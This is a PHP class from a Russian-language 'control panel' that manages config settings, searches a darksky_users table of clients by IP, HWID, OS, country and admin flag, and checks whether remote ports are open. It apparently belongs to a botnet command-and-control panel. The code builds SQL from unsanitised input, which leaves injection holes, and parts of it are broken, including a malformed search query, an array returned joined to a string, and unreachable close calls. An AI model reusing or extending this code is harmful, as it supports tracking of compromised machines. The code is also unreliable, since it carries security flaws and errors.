<?
	include_once('config/config.php');
	
	DEFINE('title', ' Панель управления v 0.5');
	DEFINE('sep', ' - ');

	class GlobalCore
	{
		var $pages, $autoclear, $dir, $domain, $lang, $ht, $settings, $showcmd, $login, $pass, $mode, $access, $title, $maxusers, $repeatban, $autoban;
		
			function __construct(){
			global $mysqli;
				$this->settings = $this->LoadConfig();
				$t = $this->settings;
				$this->dir = $t[0];
				$this->domain = $t[1];
				$this->lang = $t[2];
				$this->ht = $t[3];
				$this->autoclear = $t[4];
				$this->showcmd = $t[5];
				$this->pages = $t[6];
				$this->login = $t[7];
				$this->pass = $t[8];
				$this->mode = $t[9];
				$this->access = $t[10];
				$this->title = $t[11];
				$this->maxusers = $t[12];
				$this->repeatban = $t[13];
				$this->autoban = $t[14];
			}
			
			function LoadConfig(){
			global $mysqli;
				$sql = 'SELECT * FROM a_config WHERE 1';
				$res = $mysqli->query($sql);
				$row = $res->fetch_row();
				return $row;
				$mysqli->close();
			}
			
			function ExplodeDataMounthDayTime($str){
				$s = explode(' ', $str);
				$b = explode(':', $s[1]);
				$a = explode('-', $s[0]);
				return $a[1].'-'.$a[2].' '.intval($b[0]).':'.$b[1];
			}
			
			function UpdateConfig1($path, $domain, $lang, $chpu){
			global $mysqli;
				$sql = 'UPDATE a_config SET path = \''.$path.'\', domain = \''.$domain.'\', lang = \''.$lang.'\', chpu = \''.$chpu.'\' WHERE 1';
				return $mysqli->query($sql);
			}
			
			function ExplodeData($str){
				$s = explode(' ', $str);
				$b = explode(':', $s[1]);
				return $s[0].' '.intval($b[0]).':'.$b[1];
			}
			
			function UpdateConfig($page, $path, $domain, $lang, $chpu, $autoclear, $viewcmd, $pages, $login, $pass, $access, $repeatban, $autoban, $mode){
			global $mysqli;
			if($page == 1){
				if(strlen($pass)>0){
					$pass = ', \''.$pass.'\'';
				}
				$sql = 'UPDATE a_config SET path = \''.$path.'\', domain = \''.$domain.'\', lang = \''.$lang.'\', chpu = \''.$chpu.'\', login = \''.$login.'\' '.$pass.' WHERE 1';
			}
			if($page == 2){
				$sql = 'UPDATE a_config SET cache_delete = \''.$autoclear.'\', viewlastcmd = \''.$viewcmd.'\', maxusers = \''.$pages.'\', access = \''.$access.'\',
				mode = \''.$mode.'\', repeatban = \''.$repeatban.'\', autoban = \''.$autoban.'\' WHERE 1';
			}
				$res = $mysqli->query($sql);
				return $res;
				$mysqli->close();
			}
			
			function Enc($str){
				return mb_convert_encoding($str, 'utf-8', 'auto');
			}
			
			function Search($str){
			global $mysqli;
			$index = 0;
			$searched= array();
			$sql = "SELECT * FROM darksky_users WHERE
					LIKE \'%$str%\' OR `ip`
					LIKE \'%$str%\' OR `time`
					LIKE \'%$str%\' OR `hwid`
					LIKE \'%$str%\' OR `country`
					LIKE \'%$str%\' OR `countrycode`
					LIKE \'%$str%\' OR `os`
					LIKE \'%$str%\' OR `userpc`
					LIKE \'%$str%\' OR `status`
					LIKE \'%$str%\' OR `isadmin`
					LIKE \'%$str%\' OR `datereg`";
			//$result = $mysqli->query($sql);
			//if (!$result) {return "Database Error [{$this->database->errno}] {$this->database->error}";}
			if ($result = $mysqli->query($sql)) {
				while ($row = $result->fetch_assoc()){
					$searched[$index] = $row;
					$index++;
				}
			}
			return $searched . $sql;
			$mysqli->close();
			
			}
			
			function RemoteCheck($ip, $port){
				$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
					$connection = @socket_connect($socket, $ip, $port);
					if($connection)
					{
					   socket_close($socket);
					   return true;
					} else {
						return false;
					}
			}
			
	}
	
	
?>